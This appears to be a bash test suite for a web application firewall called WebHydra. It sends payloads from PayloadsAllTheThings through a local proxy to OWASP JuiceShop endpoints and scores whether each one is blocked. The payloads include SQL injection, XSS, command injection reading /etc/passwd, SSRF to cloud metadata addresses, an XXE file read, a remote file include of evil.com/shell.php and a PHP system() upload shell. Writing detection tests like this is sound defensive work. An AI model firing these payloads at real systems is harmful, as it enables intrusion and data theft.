#!/bin/bash
# WebHydra Demo - Comprehensive Attack Test Suite (Updated)
# Uses real payloads from PayloadsAllTheThings against JuiceShop endpoints

# Usage: ./demo.sh [--ml | --proxy]
# Default: runs all tests

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;36m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

PROXY_URL="http://127.0.0.1:8080"
SCORE=0
TOTAL_TESTS=0

# Parse arguments
MODE="all"
if [[ "$1" == "--ml" ]]; then
    MODE="ml"
    echo -e "${BLUE}Running ML Anomaly Detection Tests Only${NC}"
elif [[ "$1" == "--proxy" ]]; then
    MODE="proxy"
    echo -e "${BLUE}Running Proxy Signature Tests Only${NC}"
else
    echo -e "${BLUE}Running All Tests (Proxy + ML)${NC}"
fi

echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}    WebHydra Attack Simulation - JuiceShop Edition              ${NC}"
echo -e "${BLUE}    Payloads from PayloadsAllTheThings                          ${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
echo ""

# Function to run a test
run_test() {
    local name="$1"
    local expected="$2"
    local method="$3"
    local url="$4"
    local data="$5"
    local content_type="$6"

    ((TOTAL_TESTS++))
    echo -ne "${YELLOW}  → $name... ${NC}"

    if [ "$method" == "POST" ]; then
        if [ -n "$content_type" ]; then
            response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
                -H "Content-Type: $content_type" \
                --data-binary "$data" 2>/dev/null)
        else
            response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" -d "$data" 2>/dev/null)
        fi
    else
        response=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    fi

    # Determine if blocked (403 or 400)
    is_blocked=false
    if [ "$response" == "403" ] || [ "$response" == "400" ]; then
        is_blocked=true
    fi

    # Check if result matches expectation
    if [ "$expected" == "blocked" ] && [ "$is_blocked" == "true" ]; then
        echo -e "${GREEN}[BLOCKED]${NC} ✓"
        ((SCORE++))
    elif [ "$expected" == "allowed" ] && [ "$is_blocked" == "false" ]; then
        echo -e "${GREEN}[ALLOWED]${NC} ✓"
        ((SCORE++))
    elif [ "$expected" == "blocked" ]; then
        echo -e "${RED}[MISSED - HTTP $response]${NC}"
    else
        echo -e "${RED}[FALSE POSITIVE - HTTP $response]${NC}"
    fi
}

if [[ "$MODE" == "all" || "$MODE" == "proxy" ]]; then
    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ SQL Injection ━━━${NC}"
    run_test "SQLi - Auth Bypass" "blocked" "POST" \
        "$PROXY_URL/rest/user/login" \
        '{"email":"admin'\'' or '\''1'\''='\''1","password":"x"}' \
        "application/json"
        
    run_test "SQLi - Sleep (PATT)" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=ORDER%20BY%20SLEEP(5)"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ NoSQL Injection ━━━${NC}"
    run_test "NoSQLi - \$where" "blocked" "POST" \
        "$PROXY_URL/rest/user/login" \
        '{"email":{"$where":"1 == 1"},"password":"x"}' \
        "application/json"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Cross-Site Scripting (XSS) ━━━${NC}"
    run_test "XSS - PATT Payload" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=javascript:alert(1)//INJECTX"

    run_test "XSS - Script Tag" "blocked" "POST" \
        "$PROXY_URL/api/Feedbacks" \
        '{"comment":"<script>alert(1)</script>","rating":5}' \
        "application/json"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Command Injection ━━━${NC}"
    run_test "CMDi - cat /etc/passwd" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=%0Acat%20/etc/passwd"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ SSRF ━━━${NC}"
    run_test "SSRF - Metadata (PATT)" "blocked" "GET" \
        "$PROXY_URL/redirect?to=metadata.google.internal"

    run_test "SSRF - AWS" "blocked" "GET" \
        "$PROXY_URL/redirect?to=http://169.254.169.254/"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ XXE Injection ━━━${NC}"
    run_test "XXE - Basic Entity" "blocked" "POST" \
        "$PROXY_URL/file-upload" \
        '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' \
        "application/xml"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ SSTI ━━━${NC}"
    run_test "SSTI - Handlebars/Mustache" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q={{7*7}}"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Directory Traversal ━━━${NC}"
    run_test "Traversal - Windows win.ini" "blocked" "GET" \
        "$PROXY_URL/public/images/..\\..\\WINDOWS\\win.ini"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ LFI ━━━${NC}"
    run_test "LFI - etc/passwd" "blocked" "GET" \
        "$PROXY_URL/assets/public?file=etc/passwd"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ RFI ━━━${NC}"
    run_test "RFI - Remote URL" "blocked" "GET" \
        "$PROXY_URL/assets/public?file=http://evil.com/shell.php"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Upload Insecure Files ━━━${NC}"
    run_test "Upload - PHP Shell" "blocked" "POST" \
        "$PROXY_URL/profile/image/file.php" \
        "<?php system('id'); ?>" \
        "application/x-php"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ HTTP Parameter Pollution ━━━${NC}"
    run_test "HPP - Duplicate Parameter" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=apple&q=banana"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Open Redirect ━━━${NC}"
    run_test "Open Redirect - PATT" "blocked" "GET" \
        "$PROXY_URL/redirect?to=//google.com/%2f.."

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ CRLF Injection ━━━${NC}"
    run_test "CRLF - Cookie Injection" "blocked" "GET" \
        "$PROXY_URL/v1/user/login?email=%0aSet-Cookie:crlf=injection"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ LDAP Injection ━━━${NC}"
    run_test "LDAP - Star Wildcard" "blocked" "POST" \
        "$PROXY_URL/login" \
        'user=*)(&' \
        "application/x-www-form-urlencoded"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ XPath Injection ━━━${NC}"
    run_test "XPath - ' or '1'='1" "blocked" "POST" \
        "$PROXY_URL/login" \
        "user=' or '1'='1" \
        "application/xml"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Format String Attack ━━━${NC}"
    run_test "Format String - %s%s%s" "blocked" "GET" \
        "$PROXY_URL/profile?name=%s%s%s"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ SSI Injection ━━━${NC}"
    run_test "SSI - Exec" "blocked" "GET" \
        "$PROXY_URL/index.html?q=<!--#echo var=\"DATE_LOCAL\" -->"

    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ Buffer Overflow ━━━${NC}"
    OVERFLOW=$(python3 -c "print('A'*150)")
    run_test "Buffer Overflow - 150 As" "blocked" "POST" \
        "$PROXY_URL/api/Feedbacks" \
        "{\"comment\":\"$OVERFLOW\",\"rating\":1}" \
        "application/json"
fi

if [[ "$MODE" == "all" || "$MODE" == "ml" ]]; then
    # ═══════════════════════════════════════════════════════════════════════════
    echo -e "\n${PURPLE}━━━ ML Anomaly Detection ━━━${NC}"
    
    # High entropy payload
    GARBAGE=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%^&*' | fold -w 500 | head -n 1)
    run_test "ML - High Entropy Payload" "blocked" "POST" \
        "$PROXY_URL/api/Feedbacks" \
        "{\"comment\":\"$GARBAGE\",\"rating\":1}" \
        "application/json"

    # Keyword flood
    KEYWORD_FLOOD=$(printf 'union select %.0s' {1..100})
    run_test "ML - Keyword Flood" "blocked" "POST" \
        "$PROXY_URL/rest/products/search" \
        "q=$KEYWORD_FLOOD" \
        "application/x-www-form-urlencoded"
fi

# ═══════════════════════════════════════════════════════════════════════════
# FINAL SCORE
# ═══════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
PERCENTAGE=$((SCORE * 100 / TOTAL_TESTS))
if [ $SCORE -eq $TOTAL_TESTS ]; then
    echo -e "Final Score: ${GREEN}${SCORE}/${TOTAL_TESTS}${NC} ($PERCENTAGE%) - ${GREEN}EXCELLENT${NC}"
elif [ $PERCENTAGE -ge 70 ]; then
    echo -e "Final Score: ${YELLOW}${SCORE}/${TOTAL_TESTS}${NC} ($PERCENTAGE%) - ${YELLOW}GOOD${NC}"
else
    echo -e "Final Score: ${RED}${SCORE}/${TOTAL_TESTS}${NC} ($PERCENTAGE%) - ${RED}NEEDS IMPROVEMENT${NC}"
fi
echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
